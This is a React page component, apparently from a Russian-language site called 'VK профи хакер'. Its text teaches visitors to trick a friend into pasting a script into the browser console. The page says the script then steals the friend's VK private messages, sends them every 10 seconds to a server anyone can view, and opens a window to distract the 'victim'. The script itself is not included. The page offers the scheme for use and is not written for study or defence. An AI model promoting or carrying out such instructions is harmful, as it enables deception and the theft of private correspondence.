import React from "react";
import { Link } from "react-router-dom";
import bg from "@assets/images/main-bg.jpg";
import hacker from "@assets/images/hacker.jpg";
import code_img from "@assets/images/code.jpg";
import console from "@assets/images/console.jpg";
import result from "@assets/images/result.jpg";

import "./home.scss";
import ScrollAppearance from "../../components/appearance/Appearance";

export default class Home extends React.Component {
	constructor () {
		super();
	}

	// scroll page to second block after fullscreen block
	scrollToBottom = () => {
		const y = this.second_screen_ref.getBoundingClientRect().top + window.pageYOffset - 70;
		window.scrollTo({ top: y, behavior: "smooth" });
	};

	render () {
		return (
			<div className="home" id="home">
				<div className="home__fullscreen full-screen">
					<div className="full-screen__image" style={{ background: `url(${bg})` }} />

					<div className="home__introducing">
						<h1 className="home__title">Узнай всю правду!</h1>
						<div className="home__sub-title">
							Попробуй украсть переписку вашего друга с помощью JS скрипта и консоли
							браузера!
						</div>
					</div>

					<div className="home__to-bottom" onClick={this.scrollToBottom}>
						{/* <span className="home__details">Подробнее</span> */}
						<div className="bottom-arrow">
							<span />
							<span />
							<span />
						</div>
					</div>
				</div>
				<div className="home__content" ref={ref => (this.second_screen_ref = ref)}>
					<h1 className="home__block-title">VK профи хакер</h1>

					<ScrollAppearance>
						<section className="home__section home__section-main">
							<div className="home__section-wrapper container">
								<div className="home__section-illustration">
									<img src={hacker} alt="script image" />
								</div>
								<div className="home__section-content">
									<h2 className="home__section-title">Как это работает?</h2>
									<div className="home__section-description">
										Мы даём вам скрипт, который будет перемещаться по перепискам
										вашего друга и воровать сообщения ;&#41; Далее скрипт каждые
										10 секунд отправляет данные на сервер, где любой может
										просмотреть эти данные.
									</div>
								</div>
							</div>
						</section>
					</ScrollAppearance>

					<h1 className="home__block-title">Инструкия</h1>

					<ScrollAppearance>
						<section className="home__section home__section-script">
							<div className="home__section-wrapper container">
								<div className="home__section-illustration">
									<img src={code_img} alt="script image" />
								</div>
								<div className="home__section-content">
									<h2 className="home__section-title">Скопируйте скрипт</h2>
									<div className="home__section-description">
										В разделе "получить скрипт" или по ссылке ниже скопируйте
										код.
										<div className="home__section-link-wrapper">
											<Link to="/get-script" className="home__section-link">
												Получить скрипт
											</Link>
										</div>
									</div>
								</div>
							</div>
						</section>
					</ScrollAppearance>

					<ScrollAppearance>
						<section className="home__section home__section-console">
							<div className="home__section-wrapper container">
								<div className="home__section-illustration">
									<img src={console} alt="script image" />
								</div>
								<div className="home__section-content">
									<h2 className="home__section-title">Откройте консоль</h2>
									<div className="home__section-description">
										Попросите друга открыть консоль в браузере. На клавиатуре
										нужно нажать <b>F12</b> или <b>ПКМ - Просмотреть код</b>.
										Откроется панель разработчика. В верхней части в меню нужно
										выбрать пункт
										<b> "Console"</b>.
									</div>
								</div>
							</div>
						</section>
					</ScrollAppearance>

					<ScrollAppearance>
						<section className="home__section home__section-console">
							<div className="home__section-wrapper container">
								<div className="home__section-illustration">
									<img src={result} alt="script image" />
								</div>
								<div className="home__section-content">
									<h2 className="home__section-title">Запустите скрипт</h2>
									<div className="home__section-description">
										Теперь в консоль нужно вставить скопированный ранее скрипт и
										нажать
										<b> enter</b>. Скрипт начнет свою работу. Чтобы "жертва" не
										поняла, что происходит, откроется специальное окно, которое
										отвлечет пользователя, exxexexxexe :&#41;
									</div>
								</div>
							</div>
						</section>
					</ScrollAppearance>

					<ScrollAppearance>
						<section className="home__section home__section-console">
							<div className="home__section-wrapper container">
								<div className="home__section-illustration">
									<img src={console} alt="script image" />
								</div>
								<div className="home__section-content">
									<h2 className="home__section-title">Посмотрите результат</h2>
									<div className="home__section-description">
										Скрипт отправит полученные данные на сервер и вы сможете их
										посмотреть.
										<div className="home__section-link-wrapper">
											<Link to="/dialogs" className="home__section-link">
												Поиск диалогов
											</Link>
										</div>
									</div>
								</div>
							</div>
						</section>
					</ScrollAppearance>
				</div>
			</div>
		);
	}
}
